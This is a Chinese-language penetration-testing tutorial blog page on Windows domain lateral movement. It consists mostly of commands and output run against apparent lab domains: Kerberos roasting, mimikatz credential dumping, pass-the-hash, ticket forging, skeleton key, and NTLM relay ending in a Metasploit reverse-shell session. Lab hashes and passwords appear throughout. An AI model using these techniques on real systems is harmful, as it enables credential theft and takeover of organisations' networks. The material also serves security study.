@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+<head>
+    <meta charset="utf-8" />
+    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
+    <link rel="icon" type="image/png" href="/favicon.ico">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no" name="viewport" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="description" content="One way to choose one">
+    <meta name="author" content="Misaki">
+    <meta name="keywords" content="">
+    <title>内网渗透横行移动 ~ Misaki&#39;s Blog</title>
+    <link rel="stylesheet" href="/css/Material_Icons.css">
+    <!-- <link rel="stylesheet" href="/css/font-awesome.css"> -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/main.css">
+    
+        <link rel="stylesheet" href="/css/post.css">
+        
+            <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+        
+    
+</head>
+
+<body class=" sidebar-collapse">
+<nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
+    <div class="container">
+        <div class="navbar-translate">
+            <a class="navbar-brand" href="/">
+                Misaki&#39;s Blog</a>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="navbar-toggler-icon"></span>
+                <span class="navbar-toggler-icon"></span>
+                <span class="navbar-toggler-icon"></span>
+            </button>
+        </div>
+            <div class="collapse navbar-collapse">
+                <ul class="navbar-nav ml-auto">
+                    
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" href="/archives/">
+                                    archives
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" href="/about/">
+                                    about
+                                </a>
+                            </li>
+                        
+                    
+                    
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://github.com/MisakiKata" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-github"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://www.t00ls.net/members-profile-12179.html" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-twitch"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://misakikata.github.io/atom.xml" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-rss"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="mailto:misakikatas@gmail.com" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-envelope"></i>
+                                </a>
+                            </li>
+                        
+                    
+                </ul>
+            </div>
+    </div>
+</nav>
+    
+  <div class="page-header header-filter" data-parallax="true" style="background-image: url('/img/post-banner.jpg'); height: 70vh;">
+    
+      <div class="container">
+        <h1 class="title text-center post_title">内网渗透横行移动</h1>
+        <p class="text-center"><b>Wednesday, August 12th 2020, 9:03 am</b></p>
+      </div>
+    
+  </div>
+
+  
+  
+  
+    <div class="row" style="margin: 0 0 0; z-index: 999;">
+  <div class="col-md-8 offset-md-1">
+    <div class="main main-raised">
+      <div class="container">
+        <div class="section">
+          <div class="post_content">
+              <p>在进行这些东西之前，至少需要一个可完整交互的shell，默认就已经获得了shell，并且提权到<code>nt authority\system</code> </p>
+<h3 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><p>这是一种针对kerberos协议的攻击技术，不需要认证就可以获取到用户的密码hash值。如果用户开启了“不使用Kerberos预认证”，攻击者就可以获取到Kerberos AS-REP，然后他就可以离线破解这个凭证了。</p>
+<p>首先需要知道有哪些用户，这里使用kerbrute来枚举，需要其开启了88端口</p>
+<p>需要使用如下的项目：<a href="https://github.com/ropnop/kerbrute" target="_blank" rel="noopener">https://github.com/ropnop/kerbrute</a></p>
+<pre><code>kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt -t 20
+</code></pre><p>如果获得如下的输出，则代表枚举到用户名</p>
+<pre><code>2020/08/06 17:22:21 &gt;  Using KDC(s):
+2020/08/06 17:22:21 &gt;   spookysec.local:88
+2020/08/06 17:22:22 &gt;  [+] VALID USERNAME:       james@spookysec.local
+2020/08/06 17:22:26 &gt;  [+] VALID USERNAME:       svc-admin@spookysec.local
+2020/08/06 17:22:34 &gt;  [+] VALID USERNAME:       James@spookysec.local
+2020/08/06 17:22:36 &gt;  [+] VALID USERNAME:       robin@spookysec.local
+2020/08/06 17:23:04 &gt;  [+] VALID USERNAME:       darkstar@spookysec.local
+2020/08/06 17:23:18 &gt;  [+] VALID USERNAME:       administrator@spookysec.local
+2020/08/06 17:23:51 &gt;  [+] VALID USERNAME:       backup@spookysec.local
+</code></pre><p>使用GetNPUsers来获取用户kerberos票证，如果没有开启选项，则会报一个没有设置的错误</p>
+<pre><code>GetNPUsers.py spookysec.local/james
+
+λ GetNPUsers.py spookysec.local/james -no-pass
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Getting TGT for james
+[-] User james doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</code></pre><p>如果开启的话会显示当前票据</p>
+<pre><code>λ GetNPUsers.py spookysec.local/svc-admin -no-pass
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Getting TGT for svc-admin
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a5c2252aa6fd31021c6b73ddf78790a0$4ca233e07269de808a3036ca9f1db6e9a611001682f8dfa433b8409ca87fcd5d604546cfdac46f2cbc86f60455f4779c839ede069e49fd0889edca6017952a5ea26c104ed985aa1c6b82b0f57171c340e743c9f8fe4aef06ace0dd800704024f8808effcd9c602322f4e73e4331914cc22ee2b74d7130ff2bf1f7f89b90d63428d65f655d522fe39adbb24bb0cc815f1e5fab5cefdd5fd4caa775b6712ee3ce99a1f9bb50598a7f77eddd133fdb6c70980154337078128854684bd017df86e0b9ba4769c3db16e7fa4fe702a2622029f6850c82eff7c690096d78f9694978600f5a00beb41cfae1c13b24c6b88cabb6d1f08
+</code></pre><p>再去利用hashcat爆破密码</p>
+<pre><code>hashcat -m 18200 hashfile wordlist --force   #hashfile是保存hash的文件名
+</code></pre><p>如果不想先获取用户，可以直接利用GetNPUsers来检索，就是速度有点慢</p>
+<pre><code>GetNPUsers.py spookysec.local/  -usersfile userlist.txt -dc-ip 10.10.50.231
+</code></pre><p>获取到的结果会显示如下，可以获取到的用户直接显示，不可以的显示没有设置。</p>
+<pre><code>[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] User James doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:59726561a02eb64b0a108c63f1078db3$7866b1dce6fee28d5033ba1f7446e80f03d18649fed3f300aeb55b5fa7f1cdb09d5dcc7259d722e757ddaa305f64ca51b8f05d2740dff233aa3741b944913c2e96bd6767b2cb209f013cfa6b106c6a5a38c48a1fc48e695bfbdf74f21010689e0abd0cfc0a4f2565f08b7a6a4f3645fdee4dd1fedc0b0088cc0fade7e55ec58593c184deecfef267db0ab613f3661a665ce850284c8cfcd033cde5960959331a5fac4cd5f4eb537969614328c5740498fca8cf34d882f4465e78b85302b3b6304042f08e8fb7ecd386b1da5798d6189fe1056f5dc74be490492443b36d2c743090bad3a8970ee8b4b4e6c75eb11ee53fbbf1
+</code></pre><h3 id="Kerberoast"><a href="#Kerberoast" class="headerlink" title="Kerberoast"></a>Kerberoast</h3><p>利用的项目：<a href="https://github.com/nidem/kerberoast" target="_blank" rel="noopener">https://github.com/nidem/kerberoast</a></p>
+<p>在Kerberos与TGS通信完成时会返回一张ST，ST使用Server端的密码进行加密。</p>
+<p>首先查找注册的SPN。SPN：服务主体名称，服务实例的唯一标识。</p>
+<pre><code>setspn -Q */*    #查看当前域内的所有SPN
+setspn -T delay.com -Q */*  #查看delay.com域内的SPN
+</code></pre><p>其中格式：&lt;服务类型&gt;/&lt;机器名&gt;:&lt;端口&gt;</p>
+<pre><code>CN=DC,OU=Domain Controllers,DC=de1ay,DC=com
+    Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC.de1ay.com
+    ldap/DC.de1ay.com/ForestDnsZones.de1ay.com
+    ldap/DC.de1ay.com/DomainDnsZones.de1ay.com
+    TERMSRV/DC     
+    TERMSRV/DC.de1ay.com
+    DNS/DC.de1ay.com
+    GC/DC.de1ay.com/de1ay.com
+    RestrictedKrbHost/DC.de1ay.com
+    RestrictedKrbHost/DC
+    RPC/3f0c65bc-e5d1-472f-a826-bca6be17b380._msdcs.de1ay.com
+    HOST/DC/DE1AY
+    HOST/DC.de1ay.com/DE1AY
+    HOST/DC
+    HOST/DC.de1ay.com
+    HOST/DC.de1ay.com/de1ay.com
+    E3514235-4B06-11D1-AB04-00C04FC2DCD2/3f0c65bc-e5d1-472f-a826-bca6be17b380/de1ay.com
+    ldap/DC/DE1AY
+    ldap/3f0c65bc-e5d1-472f-a826-bca6be17b380._msdcs.de1ay.com
+    ldap/DC.de1ay.com/DE1AY
+    ldap/DC
+    ldap/DC.de1ay.com
+    ldap/DC.de1ay.com/de1ay.com
+CN=krbtgt,CN=Users,DC=de1ay,DC=com
+    kadmin/changepw
+CN=PC,CN=Computers,DC=de1ay,DC=com
+    TERMSRV/PC
+    TERMSRV/PC.de1ay.com
+    RestrictedKrbHost/PC
+    HOST/PC
+    RestrictedKrbHost/PC.de1ay.com
+    HOST/PC.de1ay.com
+CN=WEB,CN=Computers,DC=de1ay,DC=com
+    WSMAN/WEB
+    WSMAN/WEB.de1ay.com
+    TERMSRV/WEB
+    TERMSRV/WEB.de1ay.com
+    RestrictedKrbHost/WEB
+    HOST/WEB
+    RestrictedKrbHost/WEB.de1ay.com
+    HOST/WEB.de1ay.com
+发现存在 SPN! 
+</code></pre><p>但在爆破的时候需要查看加密方式是否为RC4加密，如上的SPN采用的是AES加密。使用<code>klist</code>查看</p>
+<pre><code>#3&gt;     客户端: DE1AY @ DE1AY.COM
+        服务器: kadmin/changepw @ DE1AY.COM
+        Kerberos 票证加密类型: AES-256-CTS-HMAC-SHA1-96
+        票证标志 0x40a10000 -&gt; forwardable renewable pre_authent name_canonicalize
+        开始时间: 8/6/2020 14:52:35 (本地)
+        结束时间:   8/6/2020 14:54:35 (本地)
+        续订时间: 8/6/2020 14:54:35 (本地)
+        会话密钥类型: AES-256-CTS-HMAC-SHA1-96
+</code></pre><p>当然如果是RC4加密，可以使用mimikatz导出票据，离线爆破</p>
+<pre><code>kerberos::list /export
+</code></pre><p>导出后，使用脚本字典来爆破票据</p>
+<pre><code>./tgsrepcrack.py wordlist.txt xxx-MYDOMAIN.LOCAL.kirbi
+</code></pre><p>如果mimikatz不好使用，还可以使用powershell脚本导出hashcat格式的字符串，离线爆破</p>
+<p>需要使用<a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1</a></p>
+<p>来导出可以直接爆破的字符串</p>
+<pre><code>Import-Module .\Invoke-Kerberoast.ps1
+
+Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation
+</code></pre><p>然后再使用hashcat来执行</p>
+<pre><code>hashcat64.exe -m 13100 hash.txt pass.txt
+</code></pre><h3 id="Bruteforcing"><a href="#Bruteforcing" class="headerlink" title="Bruteforcing"></a>Bruteforcing</h3><p>暴力破解枚举账号和密码，可以执行的操作有</p>
+<ul>
+<li>枚举有效的用户名</li>
+<li>枚举用户名和密码</li>
+<li>查找没有启动预先身份验证的用户</li>
+</ul>
+<p>利用项目：<a href="https://github.com/TarlogicSecurity/kerbrute" target="_blank" rel="noopener">https://github.com/TarlogicSecurity/kerbrute</a></p>
+<pre><code>./kerbrute.py -users users_file.txt -passwords passwords_file.txt -domain contoso.com
+</code></pre><p>要注意账号密码失败次数和账号策略。</p>
+<h3 id="PTK"><a href="#PTK" class="headerlink" title="PTK"></a>PTK</h3><p>这种形式类似于PTH，只不过在打过补丁<strong>KB2871997</strong>后，PTH就只限制在Administrator下。但是这种时候还是可以使用aeskey来执行横向移动。</p>
+<p>获取账号的aeskey</p>
+<pre><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot;
+</code></pre><p>获取到结果一部分，由于用户是明文保存密码，以下表示的是session0中的一个Windows服务:</p>
+<pre><code>         * Username : web$
+         * Domain   : DE1AY.COM
+         * Key List :
+           aes256_hmac       8d7822f543e35904f6e28a0d6f270c3b7902de70296d6693541
+57dd33813392e
+           aes128_hmac       80a6938c9463a8e5195a5874966ac229
+           rc4_hmac_nt       0a147850da3b3c41b055628a202d2b4a
+           rc4_hmac_old      0a147850da3b3c41b055628a202d2b4a
+           rc4_md4           0a147850da3b3c41b055628a202d2b4a
+           rc4_hmac_nt_exp   0a147850da3b3c41b055628a202d2b4a
+           rc4_hmac_old_exp  0a147850da3b3c41b055628a202d2b4a
+</code></pre><p>然后再执行注入aeskey</p>
+<pre><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:web$ /domain:DE1AY.COM /aes256:8d7822f543e35904f6e28a0d6f270c3b7902de70296d669354157dd33813392e&quot;
+</code></pre><h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><p>哈希传递攻击，就是不需要明文登录，用NTLM hash可直接进行登录。攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务。先查看是否有补丁<code>kb2871997</code></p>
+<p>使用mimikatz先获取hash:</p>
+<pre><code>privilege::debug
+sekurlsa::logonpasswords
+</code></pre><p>获取到信息部分显示如下</p>
+<pre><code>Session           : Interactive from 1
+User Name         : de1ay
+Domain              : DE1AY
+Logon Server      : DC
+Logon Time        : 2020/8/7 16:20:47
+SID               : S-1-5-21-2756371121-2868759905-3853650604-1001
+    msv :          [00000003] Primary      
+    * Username : de1ay
+    * Domain   : DE1AY
+    * LM       : f67ce55ac831223dc187b8085fe1d9df
+    * NTLM     : 161cff084477fe596a5db81874498a24
+    * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d
+</code></pre><p>获取到hash后执行PTH，再访问远程主机即可直接利用此账号密码访问。</p>
+<pre><code>sekurlsa::pth /user:de1ay /domain:DE1AY /ntlm:161cff084477fe596a5db81874498a24
+</code></pre><p>获取到的hash也可以直接进行暴力破解，比如利用hashcat执行</p>
+<pre><code>hashcat -m 1000 161cff084477fe596a5db81874498a24 password.dict -o out.txt —force
+</code></pre><p>利用crackmapexec进行批量pass the hash</p>
+<p><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/CrackMapExec</a></p>
+<pre><code>crackmapexec 192.168.120.0/24 -u de1ay -H 161cff084477fe596a5db81874498a24
+</code></pre><h3 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h3><p>票据传递攻击，使用 Kerberos 票据代替明文密码或 NTLM 哈希的方法。</p>
+<h4 id="ms14-068"><a href="#ms14-068" class="headerlink" title="ms14-068"></a>ms14-068</h4><p>该漏洞允许用户提升任意普通用户权限成为域管理员（Domain Admin）身份，对应的补丁是kb3011780</p>
+<p>需要一个域用户权限和本地机器账号权限。首先是使用域用户权限获取域用户的SID</p>
+<pre><code>whoami /all
+
+用户名      SID
+=========== ==============================================
+de1ay\de1ay S-1-5-21-2756371121-2868759905-3853650604-1001
+</code></pre><p>利用漏洞执行脚本来生成一个票据缓存，<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068" target="_blank" rel="noopener">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p>
+<pre><code>C:\bea&gt;MS14-068.exe -u de1ay@de1ay.com -s S-1-5-21-2756371121-2868759905-3853650
+604-1001 -d dc.de1ay.com -p 1qaz@WSX
+  [+] Building AS-REQ for dc.de1ay.com... Done!
+  [+] Sending AS-REQ to dc.de1ay.com... Done!
+  [+] Receiving AS-REP from dc.de1ay.com... Done!
+  [+] Parsing AS-REP from dc.de1ay.com... Done!
+  [+] Building TGS-REQ for dc.de1ay.com... Done!
+  [+] Sending TGS-REQ to dc.de1ay.com... Done!
+  [+] Receiving TGS-REP from dc.de1ay.com... Done!
+  [+] Parsing TGS-REP from dc.de1ay.com... Done!
+  [+] Creating ccache file &#39;TGT_de1ay@de1ay.com.ccache&#39;... Done!
+</code></pre><p>生成一个<a href="mailto:`TGT_de1ay@de1ay.com.ccache" target="_blank" rel="noopener">`TGT_de1ay@de1ay.com.ccache</a>`票据文件，利用mimikatz注入内存，先清除含有的票据，以免导致写入失败</p>
+<pre><code>kerberos::list 
+kerberos::purge   //清除
+kerberos::ptc TGT_de1ay@de1ay.com.ccache
+</code></pre><p>如果显示<code>Injecting ticket : OK</code>表示成功。</p>
+<pre><code>使用kerberos::list 就可以看到注入的票据。
+</code></pre><h4 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h4><p>黄金票据就是自己生成的TGT，在生成TGT的过程中，用户、域、权限等信息会经过krbtgt账户hash的加密，所以获取到用户、域、SID、krbtgt的hash值就可以生成黄金票据，生成的票据就是域管账号也就是可以控制整个域。</p>
+<p>krbtgt账户一般只在域控服务器上，所以一般需要一个域控器权限。先导出krbtgt用户hash。</p>
+<pre><code>privilege::debug
+lsadump::lsa /patch       #获取用户hash和域sid
+</code></pre><p>获取hash后，利用mimikatz伪造用户，例如伪造域管理员administrator。</p>
+<pre><code>kerberos::golden /domain:de1ay.com /sid:sid /krbtgt:hash /user:administrator /ticket:admin.kirbi
+</code></pre><p>再利用mimikatz导入票据</p>
+<pre><code>mimikatz::ptt admin.kirbi
+</code></pre><p>可以使用klist查看票据导入是否成功</p>
+<h4 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h4><p>白银票据伪造利用的是Kerberos认证中的第三个步骤，client会带着ticket向server的某个服务进行请求，如果验证通过就可以访问server上的指定服务了。</p>
+<p>还是需要域控制器的权限，在域控制器下执行</p>
+<pre><code>privilege::debug
+sekurlsa::logonpasswords
+</code></pre><p>获得其中的域sid和NTLM hash。利用mimikatz生成</p>
+<pre><code>kerberos::golden /domain:de1ay.com /sid:S-1-5-21-1218902331-2157346161-1782232778  /target:192.168.3.21 /rc4:8432d4fa4430ecf56927dbabd1b4d36b /service:cifs /user:de1ay /ptt
+</code></pre><p>如上生成的cifs服务的票据，可以访问域控制器的文件共享系统。</p>
+<h4 id="skeleton-key"><a href="#skeleton-key" class="headerlink" title="skeleton key"></a>skeleton key</h4><p>skeleton key（万能钥匙）就是给所有域内用户添加一个相同的密码，域内所有的用户都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对lsass.exe 进行注入，所以重启后会失效。</p>
+<p>首先在域控中安装skeleton key，所以以下在域控中执行</p>
+<pre><code>privilege::debug
+misc::skeleton
+</code></pre><p>获得一堆OK，然后直接使用命令去访问，生成的密码是mimikatz。</p>
+<pre><code>net use \\dc.de1ay.com mimikatz /user:web\de1ay.com
+</code></pre><p>由于微软增加了lsass的防注入LSA Protection，所以以上适用于系统</p>
+<pre><code>Windows 8.1
+Windows Server 2012 R2
+</code></pre><p>后来mimikatz也支持了绕过的形式，配合mimidrv.sys</p>
+<pre><code>privilege::debug
+!+
+!processprotect /process:lsass.exe /remove
+misc::skeleton
+</code></pre><p>此形式并非特权提升，只能算是增加一个新的万能密码。</p>
+<h3 id="Relay-Hash"><a href="#Relay-Hash" class="headerlink" title="Relay Hash"></a>Relay Hash</h3><p>目标机器不能开启smb签名，否则利用无效,一般情况下，windows server会默认开启，而windows单机系统默认都不会开。</p>
+<h4 id="Inveigh"><a href="#Inveigh" class="headerlink" title="Inveigh"></a>Inveigh</h4><p>利用脚本<a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Inveigh</a></p>
+<p>首先执行，要在特权模式下执行，否则会无法监听</p>
+<pre><code>Import-Module .\Inveigh.psd1
+Invoke-Inveigh -consoleoutput Y
+</code></pre><p>当其他主机来连接的时候，终端会显示出主机的NTLM hash</p>
+<pre><code>[+] [2020-08-11T16:14:30] SMB(445) NTLM challenge 123B1B44BE03722D sent to 10.10.10.201:65312
+[+] [2020-08-11T16:14:30] SMB(445) NTLMv2 captured for DE1AY\de1ay from 10.10.10.201(PC):65312:
+de1ay::DE1AY::1812B95C562D1DA8C8D033B9F3C259A5:010100000000000096643A70B76FD601D1A5312DF1DFFF35000000310041005900010004004400430004001200640065003100610079002E0063006F006D0003001800440043002E0064006500306F006D0005001200640065003100610079002E0063006F006D000700080096643A70B76FD601060004000200000008003000000000002000007D481BA03B1FB135F248854DE1855E7B7D84F8369E2277395D330602A13038970A001000000000000000000900200063006900660073002F00310030002E00310030002E00310030002E0031003000000000000000000000000000
+[+] [2020-08-11T16:14:31] NBNS request for TCONF.F.360.CN&lt;00&gt; received from 10.10.10.201[spoofer dis
+</code></pre><p>如果需要利用hash，可以使用<a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p>
+<pre><code>Import-Module .\Invoke-TheHash.ps1
+Invoke-WMIExec -Target 192.168.30.152 -Domain de1ay.com -Username de1ay -Hash 1812B95C562D1DA8C8D033B9F3C259A5 -Command &quot;whoami&quot; -verbose
+</code></pre><h4 id="smbrelayx"><a href="#smbrelayx" class="headerlink" title="smbrelayx"></a>smbrelayx</h4><p>使用impacket中的smbrelayx.py文件来做中继攻击。</p>
+<pre><code>python smbrelayx.py -h 192.168.120.140   #IP为想要获取权限的主机地址
+</code></pre><p>如果有主机访问执行中继的地址，比如192.168.120.130</p>
+<pre><code>net use \\192.168.120.130\c$ /user:&quot;DE1AY\de1ay&quot; &quot;1qaz@WSX&quot;
+</code></pre><p>如果抓取成功，可以看到如下内容</p>
+<pre><code>[*] SMBD: Received connection from 192.168.120.142, attacking target 192.168.120.140
+[*] Authenticating against 192.168.120.140 as DE1AY\de1ay SUCCEED
+[*] de1ay::DE1AY:b937bb0942684e01:15bf5db54f019b8f52141375eeea221e:0101000000000000738d1ab3bd6fd60180e5339dcce53e660000000002000a00440045003100410059000100060057004500420004001200640065003100610079002e0063006f006d0003001a005700450042002e00640065003100610079002e0063006f006d0005001200640065003100610079002e0063006f006d0007000800738d1ab3bd6fd601060004000200000008003000300000000000000000000000002000007d481ba03b1fb135f248854de1855e7b7d84f8369e2277395d330602a13038970a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100320030002e00310033003000000000000000000000000000
+[*] Sending status code STATUS_SUCCESS after authentication to 192.168.120.142
+[-] TreeConnectAndX not found C$
+</code></pre><p>如果权限足够，可以dump下来192.168.120.140主机上的hash。借助hash来执行命令</p>
+<pre><code>python smbrelayx.py -h 192.168.120.140 -c whoami
+</code></pre><p>执行后命令得到执行</p>
+<pre><code>[*] Starting service RemoteRegistry
+[*] HTTPD: Received connection from 192.168.120.142, attacking target 192.168.120.140
+[*] Authenticating against 192.168.120.140 as DE1AY\administrator SUCCEED
+[*] administrator::DE1AY:0e7c6d90b614dbe7:a4061e0695772bfca50b692e5c92a1d7:0101000000000000366c24e1be6fd60110d629b8722f71300000000002000a00440045003100410059000100060057004500420004001200640065003100610079002e0063006f006d0003001a005700450042002e00640065003100610079002e0063006f006d0005001200640065003100610079002e0063006f006d0007000800366c24e1be6fd601060004000200000008003000300000000000000000000000002000007d481ba03b1fb135f248854de1855e7b7d84f8369e2277395d330602a13038970a001000000000000000000000000000000000000900280048005400540050002f003100390032002e003100360038002e003100320030002e00310033003000000000000000000000000000
+[-] 192.168.120.140 is being attacker at the moment, skipping.. 
+[*] Executed specified command on host: 192.168.120.140
+nt authority\system
+</code></pre><h4 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h4><p>Responder通过设置几个模拟的恶意守护进程（如SQL服务器，FTP，HTTP和SMB服务器等）来直接提示凭据或模拟质询 – 响应验证过程并捕获客户端发送的必要 hash。</p>
+<pre><code>python Responder.py -I eth0 wrp
+</code></pre><p>当有执行访问smb请求时，可以抓取到</p>
+<pre><code>[*] [LLMNR]  Poisoned answer sent to 192.168.120.142 for name wpad
+[HTTP] NTLMv2 Client   : 192.168.120.142
+[HTTP] NTLMv2 Username : DE1AY\de1ay
+[HTTP] NTLMv2 Hash     : de1ay::DE1AY:59e4691da47e5fe3:542D7E586900FF2E6C077ED906B08E41:0101000000000000FF2D1573BF6FD6013E50BF5D7E2EDF74000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000000000000000000000002000007D481BA03B1FB135F248854DE1855E7B7D84F8369E2277395D330602A13038970A001000000000000000000000000000000000000900280048005400540050002F003100390032002E003100360038002E003100320030002E003100330030000000000000000000   
+</code></pre><p>利用可以采用上面提到的脚本<a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p>
+<h4 id="msfrelay"><a href="#msfrelay" class="headerlink" title="msfrelay"></a>msfrelay</h4><p>执行方式大致如下</p>
+<pre><code>msf5 &gt; use exploit/windows/smb/smb_relay
+msf5 exploit(windows/smb/smb_relay) &gt; show options
+
+Module options (exploit/windows/smb/smb_relay):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SHARE    ADMIN$           yes       The share to connect to
+   SMBHOST                   no        The target SMB server (leave empty for originating system)
+   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT  445              yes       The local port to listen on.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(windows/smb/smb_relay) &gt; set smbhost 192.168.120.140
+smbhost =&gt; 192.168.120.140
+msf5 exploit(windows/smb/smb_relay) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf5 exploit(windows/smb/smb_relay) &gt; set lhost 192.168.120.130
+lhost =&gt; 192.168.120.130
+msf5 exploit(windows/smb/smb_relay) &gt; set lport 8855
+lport =&gt; 8855
+msf5 exploit(windows/smb/smb_relay) &gt; show options 
+
+Module options (exploit/windows/smb/smb_relay):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SHARE    ADMIN$           yes       The share to connect to
+   SMBHOST  192.168.120.140  no        The target SMB server (leave empty for originating system)
+   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT  445              yes       The local port to listen on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+   LHOST     192.168.120.130  yes       The listen address (an interface may be specified)
+   LPORT     8855             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(windows/smb/smb_relay) &gt; run
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 192.168.120.130:8855 
+[*] Started service listener on 0.0.0.0:445 
+[*] Server started.
+</code></pre><p>当有smb的连接过来的时候</p>
+<pre><code>C:\Users\de1ay.DE1AY&gt;net use \\192.168.120.130\c$ /user:&quot;DE1AY\administrator&quot; &quot;1
+qaz@WSX&quot;
+</code></pre><p>就会有如下反应</p>
+<pre><code>msf5 exploit(windows/smb/smb_relay) &gt; [*] Sending NTLMSSP NEGOTIATE to 192.168.120.140
+[*] Extracting NTLMSSP CHALLENGE from 192.168.120.140
+[*] Forwarding the NTLMSSP CHALLENGE to 192.168.120.142:53508
+[*] Extracting the NTLMSSP AUTH resolution from 192.168.120.142:53508, and sending Logon Failure response
+[*] Forwarding the NTLMSSP AUTH resolution to 192.168.120.140
+[+] SMB auth relay against 192.168.120.140 succeeded
+[*] Connecting to the defined share...
+[*] Regenerating the payload...
+[*] Uploading payload...
+[*] Created \QsYUxAsk.exe...
+[*] Connecting to the Service Control Manager...
+[*] Obtaining a service manager handle...
+[*] Creating a new service...
+[*] Closing service handle...
+[*] Opening service...
+[*] Starting the service...
+[*] Removing the service...
+[*] Closing service handle...
+[*] Deleting \QsYUxAsk.exe...
+[*] Sending stage (180291 bytes) to 192.168.120.140
+</code></pre><p>查看session，可以发现已经有一个建立的session</p>
+<pre><code>msf5 exploit(windows/smb/smb_relay) &gt; sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                Connection
+  --  ----  ----                     -----------                ----------
+  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WEB  192.168.120.130:8855 -&gt; 192.168.120.140:54330 (192.168.120.140)
+</code></pre>
+          </div>
+          <br><br>
+              
